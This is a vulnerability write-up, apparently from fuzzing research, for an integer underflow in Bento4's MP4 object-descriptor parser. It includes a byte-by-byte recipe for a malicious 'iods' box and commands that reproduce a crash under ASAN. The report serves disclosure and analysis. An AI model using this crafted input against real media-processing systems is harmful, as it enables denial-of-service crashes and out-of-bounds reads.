# VULN-003: AP4_ObjectDescriptor Integer Underflow → ~4GB SubStream OOB Read

**CWE**: CWE-191 (Integer Underflow / Wrap-Around)  
**Binary**: `Bento4/build_test/bin/mp42aac`  
**Trigger file**: `vuln_003.mp4`

---

## Vulnerability Location

**File**: `Bento4/Source/C++/Core/Ap4ObjectDescriptor.cpp`  
**Function**: `AP4_ObjectDescriptor::AP4_ObjectDescriptor(AP4_ByteStream&, AP4_UI08, AP4_Size, AP4_Size)`  
**Lines**: ~80–103

## Root Cause

The stream-reading constructor reads `id_flags` (2 bytes) and, when `URL_flag`
is set, reads `url_length` (1 byte) followed by `url_length` bytes.  It then
computes the sub-stream size for nested descriptors:

```cpp
AP4_Position offset;
stream.Tell(offset);
AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                             payload_size - AP4_Size(offset - start));
```

`payload_size` and `AP4_Size(offset - start)` are both unsigned 32-bit.
When `payload_size = 2` and `offset - start = 4` (2 for `id_flags` + 1 for
`url_length` + 1 for `url_string`), the subtraction wraps:

    2 − 4 = 0xFFFFFFFE  (≈ 4 GB SubStream)

## Trigger Path

```
mp42aac main()
  → AP4_File(stream)
    → AP4_AtomFactory::CreateAtomFromStream()
      → AP4_IodsAtom::Create()
        → AP4_IodsAtom::AP4_IodsAtom(size, version, flags, stream)
          → AP4_DescriptorFactory::CreateDescriptorFromStream()
            → AP4_ObjectDescriptor(stream, tag=0x01, header_size=2, payload_size=2)
              ← INTEGER UNDERFLOW at payload_size − bytes_consumed
```

## Crafted MP4 Structure

```
ftyp  (mp42)
moov
  mvhd  (minimal)
  iods  (malicious)
    FullBox header: version=0, flags=0
    Descriptor bytes:
      [0x01]        tag = OD (ObjectDescriptor)
      [0x02]        declared payload_size = 2
      [0x00][0x20]  id_flags (URL_flag = bit 5 = 1)   ← 2-byte declared payload
      [0x01]        url_length = 1    ← read PAST declared boundary
      [0x41]        url_string = 'A'  ← read PAST declared boundary (P+4)
      [0x07]        attack descriptor tag   ← SubStream.m_Offset = here
                    (0x07 hits switch default → AP4_UnknownDescriptor;
                     0x0F = ES_ID_REF is handled and reads only 2 bytes,
                     bypassing the large allocation)
      [0xFF][0xFF][0xFF][0x7F]              ← 268 MB expandable payload_size
  trak  (minimal, for structural validity)
mdat  (empty)
```

## Underflow Arithmetic

```
start   = P   (stream position at declared payload start)
bits    read: P → P+2
url_len read: P+2 → P+3  (url_length = 1)
url_str read: P+3 → P+4  (1 byte)
offset  = P+4

SubStream size = payload_size − (offset − start)
              = 2 − 4
              = 0xFFFFFFFE  (unsigned wrap)   ← ~4 GB
```

## Crash Mechanism

The huge `AP4_SubStream` is immediately used to read nested descriptors.
The attack bytes at `m_Offset` decode to:

- tag = `0x07` (hits switch default → `AP4_UnknownDescriptor`)
- expandable size: `[0xFF 0xFF 0xFF 0x7F]` → `0x0FFFFFFF` = **268,435,455 bytes**

`AP4_UnknownDescriptor::AP4_UnknownDescriptor` calls:

```cpp
m_Data.SetDataSize(payload_size);          // → ReallocateBuffer(268 MB)
stream.Read(m_Data.UseData(), payload_size); // → new AP4_Byte[268435455]
```

With `ASAN_OPTIONS=mmap_limit_mb=200`:  
268 MB > 200 MB cap → **ASAN aborts** with CHECK failure:
`(total_mmaped >> 20) < common_flags()->mmap_limit_mb`.

## Reproduction

```bash
cd /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Expandable_h
python3 vuln_003_gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:mmap_limit_mb=200" \
  /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac \
  vuln_003.mp4 /dev/null
```

Or simply:

```bash
bash vuln_003_run.sh
```

## Expected Output

ASAN log contains:
```
(total_mmaped >> 20) < common_flags()->mmap_limit_mb
```
(ASAN CHECK failure when total non-shadow mmap exceeds `mmap_limit_mb=200`.)
Process exits with SIGABRT (exit code 134) or exit 1 with `abort_on_error=0`.

## Impact

- **Severity**: High
- **Effect**: ~4 GB `AP4_SubStream` created; nested descriptor factory reads
  beyond `iods` payload boundary; large allocation triggers OOM/bad_alloc.
- **Exploitability**: Attacker provides a crafted MP4 file; no user interaction
  beyond opening the file is required.
